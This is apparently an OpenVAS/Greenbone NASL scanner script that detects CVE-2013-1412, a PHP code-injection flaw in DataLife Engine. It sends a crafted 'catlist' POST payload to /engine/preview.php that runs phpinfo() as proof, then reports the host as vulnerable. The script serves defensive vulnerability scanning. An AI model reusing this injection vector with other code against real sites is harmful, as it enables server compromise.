if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103654" );
	script_bugtraq_id( 57603 );
	script_cve_id( "CVE-2013-1412" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "DataLife Engine 'catlist' Parameter PHP Code Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57603" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-02-02 12:26:45 +0100 (Sat, 02 Feb 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "DataLife Engine is prone to a remote PHP code-injection vulnerability.

An attacker can exploit this issue to inject and execute arbitrary PHP
code in the context of the affected application. This may facilitate a
compromise of the application and the underlying system. Other attacks
are also possible.

DataLife Engine 9.7 is vulnerable. Other versions may also be affected." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("url_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
vtstrings = get_vt_strings();
rand_value = vtstrings["default"];
host = http_host_name( port: port );
ex = "catlist[0]=" + urlencode( str: "catlist[0]=" + rand_value + "')||phpinfo();//" );
len = strlen( ex );
for dir in nasl_make_list_unique( "/datalife", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = NASLString( "POST ", dir, "/engine/preview.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", ex );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(ContainsString( result, "<title>phpinfo()" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

